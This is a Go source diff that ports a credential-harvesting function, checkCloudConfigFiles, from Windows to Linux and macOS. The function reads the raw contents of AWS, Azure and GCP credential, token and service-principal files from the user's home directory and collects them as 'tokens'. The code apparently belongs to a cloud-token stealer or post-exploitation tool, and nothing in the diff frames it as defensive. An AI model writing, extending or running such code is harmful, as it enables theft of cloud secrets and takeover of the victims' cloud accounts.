@@ -1,4 +1,4 @@
-//go:build windows
+//go:build linux || windows || darwin
 
 package main
 
@@ -8,6 +8,7 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strings"
 	"time"
 )
@@ -503,58 +504,31 @@ func checkCloudConfigFiles() *CloudTokenResult {
 	r := &CloudTokenResult{Provider: "Config Files"}
 	r.Tokens = []CloudToken{}
 
-	homeDir := os.Getenv("USERPROFILE")
+	homeDir, err := os.UserHomeDir()
+	if err != nil || homeDir == "" {
+		homeDir = os.Getenv("USERPROFILE")
+	}
+	if homeDir == "" {
+		homeDir = os.Getenv("HOME")
+	}
 	if homeDir == "" {
 		return r
 	}
 
-	// AWS credentials file
-	awsCredFile := homeDir + "\\.aws\\credentials"
-	if data, err := os.ReadFile(awsCredFile); err == nil {
-		r.Tokens = append(r.Tokens, CloudToken{Type: "aws_credentials_file", Resource: "~/.aws/credentials", Value: string(data)})
+	try := func(rel string, tokType, resource string) {
+		data, err := os.ReadFile(filepath.Join(append([]string{homeDir}, strings.Split(rel, "/")...)...))
+		if err == nil {
+			r.Tokens = append(r.Tokens, CloudToken{Type: tokType, Resource: resource, Value: string(data)})
+		}
 	}
-
-	// AWS config file
-	awsCfgFile := homeDir + "\\.aws\\config"
-	if data, err := os.ReadFile(awsCfgFile); err == nil {
-		r.Tokens = append(r.Tokens, CloudToken{Type: "aws_config_file", Resource: "~/.aws/config", Value: string(data)})
-	}
-
-	// Azure CLI profile
-	azProfileFile := homeDir + "\\.azure\\azureProfile.json"
-	if data, err := os.ReadFile(azProfileFile); err == nil {
-		r.Tokens = append(r.Tokens, CloudToken{Type: "azure_profile", Resource: "~/.azure/azureProfile.json", Value: string(data)})
-	}
-
-	// Azure CLI accessTokens.json
-	azTokensFile := homeDir + "\\.azure\\accessTokens.json"
-	if data, err := os.ReadFile(azTokensFile); err == nil {
-		r.Tokens = append(r.Tokens, CloudToken{Type: "azure_tokens", Resource: "~/.azure/accessTokens.json", Value: string(data)})
-	}
-
-	// GCP application default credentials
-	gcpADCFile := homeDir + "\\.config\\gcloud\\application_default_credentials.json"
-	if data, err := os.ReadFile(gcpADCFile); err == nil {
-		r.Tokens = append(r.Tokens, CloudToken{Type: "gcp_adc", Resource: "~/.config/gcloud/application_default_credentials.json", Value: string(data)})
-	}
-
-	// GCP legacy key file
-	gcpLegacyFile := homeDir + "\\.config\\gcloud\\legacy_credentials\\default\\adc.json"
-	if data, err := os.ReadFile(gcpLegacyFile); err == nil {
-		r.Tokens = append(r.Tokens, CloudToken{Type: "gcp_legacy_adc", Resource: "~/.config/gcloud/legacy_credentials/default/adc.json", Value: string(data)})
-	}
-
-	// GCP credentials db
-	gcpCredDB := homeDir + "\\.config\\gcloud\\credentials.db"
-	if data, err := os.ReadFile(gcpCredDB); err == nil {
-		r.Tokens = append(r.Tokens, CloudToken{Type: "gcp_cred_db", Resource: "~/.config/gcloud/credentials.db", Value: string(data)})
-	}
-
-	// Azure RM certificates
-	azRMCert := homeDir + "\\.azure\\servicePrincipal.json"
-	if data, err := os.ReadFile(azRMCert); err == nil {
-		r.Tokens = append(r.Tokens, CloudToken{Type: "azure_sp_json", Resource: "~/.azure/servicePrincipal.json", Value: string(data)})
-	}
+	try(".aws/credentials", "aws_credentials_file", "~/.aws/credentials")
+	try(".aws/config", "aws_config_file", "~/.aws/config")
+	try(".azure/azureProfile.json", "azure_profile", "~/.azure/azureProfile.json")
+	try(".azure/accessTokens.json", "azure_tokens", "~/.azure/accessTokens.json")
+	try(".azure/servicePrincipal.json", "azure_sp_json", "~/.azure/servicePrincipal.json")
+	try(".config/gcloud/application_default_credentials.json", "gcp_adc", "~/.config/gcloud/application_default_credentials.json")
+	try(".config/gcloud/legacy_credentials/default/adc.json", "gcp_legacy_adc", "~/.config/gcloud/legacy_credentials/default/adc.json")
+	try(".config/gcloud/credentials.db", "gcp_cred_db", "~/.config/gcloud/credentials.db")
 
 	return r
 }
